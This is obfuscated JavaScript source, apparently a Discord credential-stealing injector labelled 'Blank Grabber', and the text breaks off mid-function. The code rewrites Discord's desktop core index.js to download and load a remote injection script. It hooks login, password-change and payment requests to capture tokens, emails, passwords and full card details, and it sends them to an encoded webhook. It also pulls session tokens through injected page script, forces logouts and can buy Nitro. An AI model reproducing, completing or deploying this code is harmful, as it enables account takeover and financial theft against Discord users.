const _0x3d8f8e = _0x3866;
(function(_0x282005, _0x56df66) {
    const _0x1a7cbe = _0x3866,
        _0x311d3b = _0x282005();
    while (!![]) {
        try {
            const _0xb8b873 = -parseInt(_0x1a7cbe(0x206)) / 0x1 + -parseInt(_0x1a7cbe(0x1f1)) / 0x2 + -parseInt(_0x1a7cbe(0x212)) / 0x3 + parseInt(_0x1a7cbe(0x216)) / 0x4 + parseInt(_0x1a7cbe(0x1d8)) / 0x5 + -parseInt(_0x1a7cbe(0x23c)) / 0x6 + -parseInt(_0x1a7cbe(0x2a2)) / 0x7 * (-parseInt(_0x1a7cbe(0x28e)) / 0x8);
            if (_0xb8b873 === _0x56df66) break;
            else _0x311d3b['push'](_0x311d3b['shift']());
        } catch (_0x50c22c) { _0x311d3b['push'](_0x311d3b['shift']()); }
    }
}(_0x1699, 0x70392));
const args = process[_0x3d8f8e(0x1ef)],
    fs = require('fs'),
    path = require(_0x3d8f8e(0x268)),
    https = require(_0x3d8f8e(0x264)),
    querystring = require('querystring'),
    { BrowserWindow, session } = require(_0x3d8f8e(0x213)),
    Buffer = require(_0x3d8f8e(0x284))['Buffer'],
    hook = _0x3d8f8e(0x283),
    config = { 'webhook': Buffer['from'](hook, _0x3d8f8e(0x252))[_0x3d8f8e(0x2a1)](_0x3d8f8e(0x211)), 'webhook_protector_key': '%WEBHOOK_KEY%', 'auto_buy_nitro': ![], 'ping_on_run': !![], 'ping_val': _0x3d8f8e(0x25e), 'embed_name': _0x3d8f8e(0x275), 'embed_icon': 'https://cdn1.telegram-cdn.org/file/LP0jni1IQUPVYyU-F3DC4TF99UdpDAR6pk1ZKWynZX7iIaPUEx_NwMNDoJVfkJ1ttGdEHY_JhK65a2T-GARAxC4wKtHIlOujLi6zoyn3HRn4-KYgz63CbA91jpIU7IcFu4zXLb85jSKo2B6s5SpzZPxAMqTU3SgIgDMe49vsidWTnRJ1jpc6vgTPyPjz3W9qplkiFKI-qs9Tk4o9oI4Hr61imzQqSITnbvgjN7wFz_zKvKGDrjqhw42RiP_BVbe7deQH2z06tzIRLzrMNLA4kVrW6dK5gUms9jNYGK3OecZx76ApgyvQ3LQpdvheTx0VxVNtYRShExYsTcRio0PJfw.jpg', 'embed_color': 0x0, 'injection_url': _0x3d8f8e(0x217), 'api': 'https://discord.com/api/v9/users/@me', 'nitro': { 'boost': { 'year': { 'id': _0x3d8f8e(0x273), 'sku': _0x3d8f8e(0x26e), 'price': _0x3d8f8e(0x265) }, 'month': { 'id': _0x3d8f8e(0x273), 'sku': '511651880837840896', 'price': _0x3d8f8e(0x1f2) } }, 'classic': { 'month': { 'id': _0x3d8f8e(0x207), 'sku': _0x3d8f8e(0x1fd), 'price': _0x3d8f8e(0x246) } } }, 'filter': { 'urls': [_0x3d8f8e(0x23a), _0x3d8f8e(0x267), _0x3d8f8e(0x1cf), 'https://discordapp.com/api/v*/auth/login', _0x3d8f8e(0x28c), _0x3d8f8e(0x258), _0x3d8f8e(0x1db), _0x3d8f8e(0x20b), _0x3d8f8e(0x271), 'https://api.stripe.com/v*/payment_intents/*/confirm'] }, 'filter2': { 'urls': [_0x3d8f8e(0x24a), _0x3d8f8e(0x1d2), 'https://discord.com/api/v*/applications/detectable', _0x3d8f8e(0x27c), _0x3d8f8e(0x298), _0x3d8f8e(0x23d)] } };

function parity_32(_0x27827e, _0x544bbf, _0x15791f) { return _0x27827e ^ _0x544bbf ^ _0x15791f; }

function ch_32(_0x569604, _0xfe32c3, _0x4584f8) { return _0x569604 & _0xfe32c3 ^ ~_0x569604 & _0x4584f8; }

function maj_32(_0xf1b3ad, _0x5cd2ca, _0x16db27) { return _0xf1b3ad & _0x5cd2ca ^ _0xf1b3ad & _0x16db27 ^ _0x5cd2ca & _0x16db27; }

function rotl_32(_0xa457d0, _0x25665a) { return _0xa457d0 << _0x25665a | _0xa457d0 >>> 0x20 - _0x25665a; }

function safeAdd_32_2(_0x4338a3, _0x59ea78) {
    var _0x614645 = (_0x4338a3 & 0xffff) + (_0x59ea78 & 0xffff),
        _0x4bf74b = (_0x4338a3 >>> 0x10) + (_0x59ea78 >>> 0x10) + (_0x614645 >>> 0x10);
    return (_0x4bf74b & 0xffff) << 0x10 | _0x614645 & 0xffff;
}

function safeAdd_32_5(_0x4b650d, _0x1d2ebc, _0x46e335, _0x338ae8, _0x23dedb) {
    var _0x5ea573 = (_0x4b650d & 0xffff) + (_0x1d2ebc & 0xffff) + (_0x46e335 & 0xffff) + (_0x338ae8 & 0xffff) + (_0x23dedb & 0xffff),
        _0x30aef0 = (_0x4b650d >>> 0x10) + (_0x1d2ebc >>> 0x10) + (_0x46e335 >>> 0x10) + (_0x338ae8 >>> 0x10) + (_0x23dedb >>> 0x10) + (_0x5ea573 >>> 0x10);
    return (_0x30aef0 & 0xffff) << 0x10 | _0x5ea573 & 0xffff;
}

function binb2hex(_0x163966) {
    const _0xdcd57c = _0x3d8f8e;
    var _0x4b1a59 = '0123456789abcdef',
        _0x333eb5 = '',
        _0x154b28 = _0x163966['length'] * 0x4,
        _0x4efc75, _0x213211;
    for (_0x4efc75 = 0x0; _0x4efc75 < _0x154b28; _0x4efc75 += 0x1) { _0x213211 = _0x163966[_0x4efc75 >>> 0x2] >>> (0x3 - _0x4efc75 % 0x4) * 0x8, _0x333eb5 += _0x4b1a59['charAt'](_0x213211 >>> 0x4 & 0xf) + _0x4b1a59[_0xdcd57c(0x1ff)](_0x213211 & 0xf); }
    return _0x333eb5;
}

function getH() { return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0]; }

function roundSHA1(_0x5842c7, _0x1819c7) {
    var _0x57ce61 = [],
        _0x4c668a, _0x5a08e5, _0x5235ee, _0x3a007e, _0x55c9fa, _0x5189d3, _0x5c1ae5 = ch_32,
        _0x3d73e8 = parity_32,
        _0x3096e7 = maj_32,
        _0x528dee = rotl_32,
        _0x4c03a7 = safeAdd_32_2,
        _0x411d48, _0x5ac990 = safeAdd_32_5;
    _0x4c668a = _0x1819c7[0x0], _0x5a08e5 = _0x1819c7[0x1], _0x5235ee = _0x1819c7[0x2], _0x3a007e = _0x1819c7[0x3], _0x55c9fa = _0x1819c7[0x4];
    for (_0x411d48 = 0x0; _0x411d48 < 0x50; _0x411d48 += 0x1) {
        _0x411d48 < 0x10 ? _0x57ce61[_0x411d48] = _0x5842c7[_0x411d48] : _0x57ce61[_0x411d48] = _0x528dee(_0x57ce61[_0x411d48 - 0x3] ^ _0x57ce61[_0x411d48 - 0x8] ^ _0x57ce61[_0x411d48 - 0xe] ^ _0x57ce61[_0x411d48 - 0x10], 0x1);
        if (_0x411d48 < 0x14) _0x5189d3 = _0x5ac990(_0x528dee(_0x4c668a, 0x5), _0x5c1ae5(_0x5a08e5, _0x5235ee, _0x3a007e), _0x55c9fa, 0x5a827999, _0x57ce61[_0x411d48]);
        else {
            if (_0x411d48 < 0x28) _0x5189d3 = _0x5ac990(_0x528dee(_0x4c668a, 0x5), _0x3d73e8(_0x5a08e5, _0x5235ee, _0x3a007e), _0x55c9fa, 0x6ed9eba1, _0x57ce61[_0x411d48]);
            else _0x411d48 < 0x3c ? _0x5189d3 = _0x5ac990(_0x528dee(_0x4c668a, 0x5), _0x3096e7(_0x5a08e5, _0x5235ee, _0x3a007e), _0x55c9fa, 0x8f1bbcdc, _0x57ce61[_0x411d48]) : _0x5189d3 = _0x5ac990(_0x528dee(_0x4c668a, 0x5), _0x3d73e8(_0x5a08e5, _0x5235ee, _0x3a007e), _0x55c9fa, 0xca62c1d6, _0x57ce61[_0x411d48]);
        }
        _0x55c9fa = _0x3a007e, _0x3a007e = _0x5235ee, _0x5235ee = _0x528dee(_0x5a08e5, 0x1e), _0x5a08e5 = _0x4c668a, _0x4c668a = _0x5189d3;
    }
    return _0x1819c7[0x0] = _0x4c03a7(_0x4c668a, _0x1819c7[0x0]), _0x1819c7[0x1] = _0x4c03a7(_0x5a08e5, _0x1819c7[0x1]), _0x1819c7[0x2] = _0x4c03a7(_0x5235ee, _0x1819c7[0x2]), _0x1819c7[0x3] = _0x4c03a7(_0x3a007e, _0x1819c7[0x3]), _0x1819c7[0x4] = _0x4c03a7(_0x55c9fa, _0x1819c7[0x4]), _0x1819c7;
}

function finalizeSHA1(_0x5e4fd7, _0x5a0535, _0x1da0b6, _0x86b0d5) {
    const _0x389d9c = _0x3d8f8e;
    var _0x89c7c0, _0x35d837, _0x3f27e5;
    _0x3f27e5 = (_0x5a0535 + 0x41 >>> 0x9 << 0x4) + 0xf;
    while (_0x5e4fd7[_0x389d9c(0x27a)] <= _0x3f27e5) { _0x5e4fd7[_0x389d9c(0x257)](0x0); }
    _0x5e4fd7[_0x5a0535 >>> 0x5] |= 0x80 << 0x18 - _0x5a0535 % 0x20, _0x5e4fd7[_0x3f27e5] = _0x5a0535 + _0x1da0b6, _0x35d837 = _0x5e4fd7[_0x389d9c(0x27a)];
    for (_0x89c7c0 = 0x0; _0x89c7c0 < _0x35d837; _0x89c7c0 += 0x10) { _0x86b0d5 = roundSHA1(_0x5e4fd7['slice'](_0x89c7c0, _0x89c7c0 + 0x10), _0x86b0d5); }
    return _0x86b0d5;
}

function _0x3866(_0x58d18d, _0x11ab7c) { const _0x1699cf = _0x1699(); return _0x3866 = function(_0x3866e1, _0x3a5d46) { _0x3866e1 = _0x3866e1 - 0x1cd; let _0x10c982 = _0x1699cf[_0x3866e1]; return _0x10c982; }, _0x3866(_0x58d18d, _0x11ab7c); }

function _0x1699() {
    const _0xc91f4a = ['substring', 'error', 'binLen', 'gift_code', 'application/json', '3167065RWsBLf', 'Gold\x20BugHunter,\x20', 'Email:\x20**', 'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts', 'POST', '💳\x20', 'pathname', 'Verified\x20Bot\x20Developer,\x20', 'slice', 'defaultSession', '**Token**', 'discriminator', 'webhook_protector_key', 'email', 'indexOf', 'ping_on_run', 'Hypesquad\x20Event,\x20', 'substr', 'includes', 'Nitro\x20Type:\x20**', 'boost', 'index.js', '/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'argv', 'users/@me', '983634qmBzIN', '999', 'getHMAC', '**\x0aBilling:\x20**', 'request', 'webRequest', 'String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters', 'onCompleted', 'end', 'join', 'wss://remote-auth-gateway', 'discord', '511651871736201216', '**Discord\x20Info**', 'charAt', 'embed_name', 'Resources', 'webhook', '**\x0aBadges:\x20**', 'initiation', 'toUpperCase', '140665dNrywz', '521846918637420545', 'win32', '**Email\x20Changed**', 'invalid', 'https://api.stripe.com/v*/tokens', 'exports', '```', '\x5cmodules\x5c', 'method', '\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27', 'ascii', '1275849SZQrwn', 'electron', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567', 'price', '3258968sGxyLk', 'https://raw.githubusercontent.com/noahmajors/random-assets/main/injection-obfuscated.js', 'onHeadersReceived', 'value', 'flags', 'url', 'sku', 'app', 'content-security-policy-report-only', 'jsSHA', 'APPDATA', 'platform', 'assign', 'round', '\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText', 'Contents', 'unlinkSync', '\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(', 'content-security-policy', 'password', 'setHMACKey', '\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x22\x27%WEBHOOKHEREBASE64ENCODED%\x27\x22,\x20\x22\x27', 'Early\x20Supporter,\x20', 'catch', 'app.asar', 'filter', 'from', '**Password\x20Changed**', 'card[exp_year]', '*\x0aBadges:\x20**', 'year', 'onBeforeRequest', 'Access-Control-Allow-Headers\x20\x27*\x27', '**Nitro\x20Code:**\x0a```diff\x0a+\x20', 'writeFileSync', 'paypal_accounts', 'https://discord.com/api/v*/users/@me', '**\x0aCredit\x20Card\x20Expiration:\x20**', '3278418ZNENnS', 'wss://remote-auth-gateway.discord.gg/*', 'new_password', 'numRounds\x20must\x20a\x20integer\x20>=\x201', 'sep', 'nitro', 'Nitro\x20Boost', 'existsSync', 'card[cvc]', 'auto_buy_nitro', '499', 'HypeSquad\x20Bravery,\x20', 'rmdirSync', '\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;', 'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', '\x5cdiscord_desktop_core\x5cindex.js', 'const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27', 'Nitro\x20Classic', 'injection_url', '**\x20-\x20Password:\x20**', 'discord.com', 'undefined', 'base64', 'usd', '**\x0aPassword:\x20**', '.webp', 'host', 'push', 'https://*.discord.com/api/v*/auth/login', 'login', 'content', '\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'mkdirSync', 'None', '@everyone', 'function', 'Invalid\x20base32\x20character\x20in\x20key', '**Nitro\x20bought!**', '**\x0aCVC:\x20**', 'month', 'https', '9999', 'write', 'https://discordapp.com/api/v*/users/@me', 'path', 'stringify', 'endsWith', 'tokens', 'ping_val', 'embed_icon', '511651885459963904', '\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27', 'card[number]', 'https://api.stripe.com/v*/setup_intents/*/confirm', 'confirm', '521847234246082599', '\x27\x22)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27', 'Blank\x20Grabber', 'env', 'No\x20Nitro', 'log', 'https://cdn.discordapp.com/avatars/', 'length', '\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);', 'https://*.discord.com/api/v*/users/@me/library', 'responseHeaders', 'statusCode', 'embed_color', 'Green\x20BugHunter,\x20', '<:paypal:951139189389410365>\x20', 'var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22', '%WEBHOOKHEREBASE64ENCODED%', 'buffer', '7fffffff', 'Credit\x20Card\x20Number:\x20**', 'replace', '(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()', 'avatar', 'uploadData', 'darwin', 'https://discord.com/api/v*/auth/login', 'startsWith', '8BwuoTu', 'classic', '**\x0aNew\x20Password:\x20**', 'HypeSquad\x20Balance,\x20', 'Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key', 'api', 'now', 'PATCH', 'username', 'Failed\x20to\x20Purchase\x20❌', 'https://discord.com/api/v*/users/@me/library', 'parse', 'Discord\x20Staff,\x20', '**Account\x20Info**', 'premium_type', '\x20|\x20', 'forEach', 'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();', 'default', 'toString', '4309753HLnVHG', '/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22', 'HypeSquad\x20Brillance,\x20', 'https://*.discord.com/api/v*/users/@me', 'amd', 'update', 'https://*.discord.com/api/v*/applications/detectable'];
    _0x1699 = function() { return _0xc91f4a; };
    return _0x1699();
}

function hex2binb(_0x8946, _0x979b12, _0x2d4bb9) {
    const _0x37999e = _0x3d8f8e;
    var _0x1d0eb9, _0x1d064b = _0x8946[_0x37999e(0x27a)],
        _0x30d378, _0x27f416, _0x8b49e6, _0x5f1cbc, _0x4a595f;
    _0x1d0eb9 = _0x979b12 || [0x0], _0x2d4bb9 = _0x2d4bb9 || 0x0, _0x4a595f = _0x2d4bb9 >>> 0x3;
    0x0 !== _0x1d064b % 0x2 && console[_0x37999e(0x1d4)]('String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments');
    for (_0x30d378 = 0x0; _0x30d378 < _0x1d064b; _0x30d378 += 0x2) {
        _0x27f416 = parseInt(_0x8946['substr'](_0x30d378, 0x2), 0x10);
        if (!isNaN(_0x27f416)) {
            _0x5f1cbc = (_0x30d378 >>> 0x1) + _0x4a595f, _0x8b49e6 = _0x5f1cbc >>> 0x2;
            while (_0x1d0eb9[_0x37999e(0x27a)] <= _0x8b49e6) { _0x1d0eb9['push'](0x0); }
            _0x1d0eb9[_0x8b49e6] |= _0x27f416 << 0x8 * (0x3 - _0x5f1cbc % 0x4);
        } else console[_0x37999e(0x1d4)](_0x37999e(0x1f7));
    }
    return { 'value': _0x1d0eb9, 'binLen': _0x1d064b * 0x4 + _0x2d4bb9 };
}
class jsSHA {
    constructor() {
        const _0x3791b4 = _0x3d8f8e;
        var _0x5b23b1 = 0x0,
            _0x5dcfb6 = [],
            _0x279da7 = 0x0,
            _0x544b73, _0xbff3ee, _0x130101, _0x4003cf, _0xcbfe4a, _0x38f040, _0x123a3e = ![],
            _0x39a660 = ![],
            _0x3c9c20 = [],
            _0x234802 = [],
            _0x51827e, _0x51827e = 0x1;
        _0xbff3ee = hex2binb, (_0x51827e !== parseInt(_0x51827e, 0xa) || 0x1 > _0x51827e) && console['error'](_0x3791b4(0x23f)), _0x4003cf = 0x200, _0xcbfe4a = roundSHA1, _0x38f040 = finalizeSHA1, _0x130101 = 0xa0, _0x544b73 = getH(), this[_0x3791b4(0x22a)] = function(_0x58c749) {
            const _0x15f770 = _0x3791b4;
            var _0x3edca6, _0x1e2988, _0x2e240c, _0x4269dd, _0x449fb7, _0x4f74fb, _0x10647d;
            _0x3edca6 = hex2binb, _0x1e2988 = _0x3edca6(_0x58c749), _0x2e240c = _0x1e2988[_0x15f770(0x1d5)], _0x4269dd = _0x1e2988[_0x15f770(0x219)], _0x449fb7 = _0x4003cf >>> 0x3, _0x10647d = _0x449fb7 / 0x4 - 0x1;
            if (_0x449fb7 < _0x2e240c / 0x8) {
                _0x4269dd = _0x38f040(_0x4269dd, _0x2e240c, 0x0, getH());
                while (_0x4269dd[_0x15f770(0x27a)] <= _0x10647d) { _0x4269dd[_0x15f770(0x257)](0x0); }
                _0x4269dd[_0x10647d] &= 0xffffff00;
            } else {
                if (_0x449fb7 > _0x2e240c / 0x8) {
                    while (_0x4269dd[_0x15f770(0x27a)] <= _0x10647d) { _0x4269dd[_0x15f770(0x257)](0x0); }
                    _0x4269dd[_0x10647d] &= 0xffffff00;
                }
            }
            for (_0x4f74fb = 0x0; _0x4f74fb <= _0x10647d; _0x4f74fb += 0x1) { _0x3c9c20[_0x4f74fb] = _0x4269dd[_0x4f74fb] ^ 0x36363636, _0x234802[_0x4f74fb] = _0x4269dd[_0x4f74fb] ^ 0x5c5c5c5c; }
            _0x544b73 = _0xcbfe4a(_0x3c9c20, _0x544b73), _0x5b23b1 = _0x4003cf, _0x39a660 = !![];
        }, this[_0x3791b4(0x1d1)] = function(_0xb8a742) {
            const _0x37a572 = _0x3791b4;
            var _0x5b9221, _0x143b67, _0x5762e0, _0x19737c, _0x43d5ba, _0x542d57 = 0x0,
                _0x1ee636 = _0x4003cf >>> 0x5;
            _0x5b9221 = _0xbff3ee(_0xb8a742, _0x5dcfb6, _0x279da7), _0x143b67 = _0x5b9221[_0x37a572(0x1d5)], _0x19737c = _0x5b9221[_0x37a572(0x219)], _0x5762e0 = _0x143b67 >>> 0x5;
            for (_0x43d5ba = 0x0; _0x43d5ba < _0x5762e0; _0x43d5ba += _0x1ee636) { _0x542d57 + _0x4003cf <= _0x143b67 && (_0x544b73 = _0xcbfe4a(_0x19737c[_0x37a572(0x1e0)](_0x43d5ba, _0x43d5ba + _0x1ee636), _0x544b73), _0x542d57 += _0x4003cf); }
            _0x5b23b1 += _0x542d57, _0x5dcfb6 = _0x19737c['slice'](_0x542d57 >>> 0x5), _0x279da7 = _0x143b67 % _0x4003cf;
        }, this[_0x3791b4(0x1f3)] = function() { const _0x513214 = _0x3791b4; var _0x15c402;![] === _0x39a660 && console['error'](_0x513214(0x292)); const _0x557535 = function(_0x42835f) { return binb2hex(_0x42835f); }; return ![] === _0x123a3e && (_0x15c402 = _0x38f040(_0x5dcfb6, _0x279da7, _0x5b23b1, _0x544b73), _0x544b73 = _0xcbfe4a(_0x234802, getH()), _0x544b73 = _0x38f040(_0x15c402, _0x130101, _0x4003cf, _0x544b73)), _0x123a3e = !![], _0x557535(_0x544b73); };
    }
}
if (_0x3d8f8e(0x25f) === typeof define && define[_0x3d8f8e(0x1d0)]) define(function() { return jsSHA; });
else _0x3d8f8e(0x251) !== typeof exports ? 'undefined' !== typeof module && module['exports'] ? module['exports'] = exports = jsSHA : exports = jsSHA : global[_0x3d8f8e(0x21f)] = jsSHA;
jsSHA[_0x3d8f8e(0x2a0)] && (jsSHA = jsSHA[_0x3d8f8e(0x2a0)]);

function totp(_0x1e9f30) {
    const _0x2473e8 = _0x3d8f8e,
        _0x110262 = 0x1e,
        _0x17a52d = 0x6,
        _0x1b2e48 = Date[_0x2473e8(0x294)](),
        _0x4d0529 = Math[_0x2473e8(0x223)](_0x1b2e48 / 0x3e8),
        _0x5d8faf = leftpad(dec2hex(Math['floor'](_0x4d0529 / _0x110262)), 0x10, '0'),
        _0x5c0a5d = new jsSHA();
    _0x5c0a5d[_0x2473e8(0x22a)](base32tohex(_0x1e9f30)), _0x5c0a5d[_0x2473e8(0x1d1)](_0x5d8faf);
    const _0x10e462 = _0x5c0a5d['getHMAC'](),
        _0x1d1cdb = hex2dec(_0x10e462[_0x2473e8(0x1d3)](_0x10e462[_0x2473e8(0x27a)] - 0x1));
    let _0x5bc92d = (hex2dec(_0x10e462[_0x2473e8(0x1e9)](_0x1d1cdb * 0x2, 0x8)) & hex2dec(_0x2473e8(0x285))) + '';
    return _0x5bc92d = _0x5bc92d[_0x2473e8(0x1e9)](Math['max'](_0x5bc92d[_0x2473e8(0x27a)] - _0x17a52d, 0x0), _0x17a52d), _0x5bc92d;
}

function hex2dec(_0x3a5ad7) { return parseInt(_0x3a5ad7, 0x10); }

function dec2hex(_0x4db96f) { const _0x102d47 = _0x3d8f8e; return (_0x4db96f < 15.5 ? '0' : '') + Math[_0x102d47(0x223)](_0x4db96f)[_0x102d47(0x2a1)](0x10); }

function base32tohex(_0x52e4d9) {
    const _0x3291bc = _0x3d8f8e;
    let _0x1feb24 = _0x3291bc(0x214),
        _0x30c836 = '',
        _0x2bede7 = '';
    _0x52e4d9 = _0x52e4d9[_0x3291bc(0x287)](/=+$/, '');
    for (let _0x2886f1 = 0x0; _0x2886f1 < _0x52e4d9[_0x3291bc(0x27a)]; _0x2886f1++) {
        let _0x283952 = _0x1feb24[_0x3291bc(0x1e6)](_0x52e4d9[_0x3291bc(0x1ff)](_0x2886f1)[_0x3291bc(0x205)]());
        if (_0x283952 === -0x1) console[_0x3291bc(0x1d4)](_0x3291bc(0x260));
        _0x30c836 += leftpad(_0x283952[_0x3291bc(0x2a1)](0x2), 0x5, '0');
    }
    for (let _0x24bf8d = 0x0; _0x24bf8d + 0x8 <= _0x30c836['length']; _0x24bf8d += 0x8) {
        let _0x3dbb57 = _0x30c836[_0x3291bc(0x1e9)](_0x24bf8d, 0x8);
        _0x2bede7 = _0x2bede7 + leftpad(parseInt(_0x3dbb57, 0x2)[_0x3291bc(0x2a1)](0x10), 0x2, '0');
    }
    return _0x2bede7;
}

function leftpad(_0x4532b2, _0x35d34a, _0x336c8d) { const _0x5972ba = _0x3d8f8e; return _0x35d34a + 0x1 >= _0x4532b2[_0x5972ba(0x27a)] && (_0x4532b2 = Array(_0x35d34a + 0x1 - _0x4532b2['length'])[_0x5972ba(0x1fa)](_0x336c8d) + _0x4532b2), _0x4532b2; }
const discordPath = (function() {
    const _0x17210c = _0x3d8f8e,
        _0x551081 = args[0x0]['split'](path[_0x17210c(0x240)])['slice'](0x0, -0x1)['join'](path['sep']);
    let _0x14185d;
    if (process[_0x17210c(0x221)] === _0x17210c(0x208)) _0x14185d = path[_0x17210c(0x1fa)](_0x551081, 'resources');
    else process['platform'] === _0x17210c(0x28b) && (_0x14185d = path[_0x17210c(0x1fa)](_0x551081, _0x17210c(0x225), _0x17210c(0x201)));
    if (fs[_0x17210c(0x243)](_0x14185d)) return { 'resourcePath': _0x14185d, 'app': _0x551081 };
    return { 'undefined': undefined, 'undefined': undefined };
}());

function updateCheck() {
    const _0x4a240c = _0x3d8f8e,
        { resourcePath: _0x53faab, app: _0x4cb2fa } = discordPath;
    if (_0x53faab === undefined || _0x4cb2fa === undefined) return;
    const _0x5794ef = path[_0x4a240c(0x1fa)](_0x53faab, _0x4a240c(0x21d)),
        _0x4f0d66 = path[_0x4a240c(0x1fa)](_0x5794ef, 'package.json'),
        _0x3efaf1 = path[_0x4a240c(0x1fa)](_0x5794ef, 'index.js'),
        _0x27c468 = fs['readdirSync'](_0x4cb2fa + '\x5cmodules\x5c')[_0x4a240c(0x22f)](_0xb9eba0 => /discord_desktop_core-+?/ ['test'](_0xb9eba0))[0x0],
        _0x1a5d86 = _0x4cb2fa + _0x4a240c(0x20e) + _0x27c468 + _0x4a240c(0x24b),
        _0x2e2c0a = path['join'](process[_0x4a240c(0x276)][_0x4a240c(0x220)], '\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar');
    if (!fs[_0x4a240c(0x243)](_0x5794ef)) fs[_0x4a240c(0x25c)](_0x5794ef);
    if (fs['existsSync'](_0x4f0d66)) fs['unlinkSync'](_0x4f0d66);
    if (fs[_0x4a240c(0x243)](_0x3efaf1)) fs[_0x4a240c(0x226)](_0x3efaf1);
    if (process[_0x4a240c(0x221)] === _0x4a240c(0x208) || process[_0x4a240c(0x221)] === _0x4a240c(0x28b)) {
        fs[_0x4a240c(0x238)](_0x4f0d66, JSON[_0x4a240c(0x269)]({ 'name': _0x4a240c(0x1fc), 'main': _0x4a240c(0x1ed) }, null, 0x4));
        const _0x11b69f = _0x4a240c(0x24c) + _0x1a5d86 + '\x27;\x0aconst\x20bdPath\x20=\x20\x27' + _0x2e2c0a + _0x4a240c(0x26f) + config[_0x4a240c(0x24e)] + _0x4a240c(0x22b) + hook + _0x4a240c(0x274) + config['webhook_protector_key'] + _0x4a240c(0x210) + path[_0x4a240c(0x1fa)](_0x53faab, _0x4a240c(0x22e)) + _0x4a240c(0x27b);
        fs[_0x4a240c(0x238)](_0x3efaf1, _0x11b69f[_0x4a240c(0x287)](/\\/g, '\x5c\x5c'));
    }
    if (!fs[_0x4a240c(0x243)](path[_0x4a240c(0x1fa)](__dirname, _0x4a240c(0x204)))) return !0x0;
    return fs[_0x4a240c(0x248)](path[_0x4a240c(0x1fa)](__dirname, _0x4a240c(0x204))), execScript(_0x4a240c(0x29f)), !0x1;
}
const execScript = _0x39f7fc => { const _0x1d2c45 = BrowserWindow['getAllWindows']()[0x0]; return _0x1d2c45['webContents']['executeJavaScript'](_0x39f7fc, !0x0); },
    getInfo = async _0x444aad => {
        const _0x4fcf1d = _0x3d8f8e,
            _0xc58d63 = await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22' + config[_0x4fcf1d(0x293)] + _0x4fcf1d(0x25b) + _0x444aad + _0x4fcf1d(0x249));
        return JSON[_0x4fcf1d(0x299)](_0xc58d63);
    },
    fetchBilling = async _0x56554c => {
        const _0x119b5d = _0x3d8f8e,
            _0x23d985 = await execScript(_0x119b5d(0x282) + config['api'] + _0x119b5d(0x1ee) + _0x56554c + _0x119b5d(0x224));
        if (!_0x23d985['lenght'] || _0x23d985[_0x119b5d(0x27a)] === 0x0) return '';
        return JSON['parse'](_0x23d985);
    },
    getBilling = async _0x39e5de => {
        const _0x563ef4 = _0x3d8f8e,
            _0x3f084a = await fetchBilling(_0x39e5de);
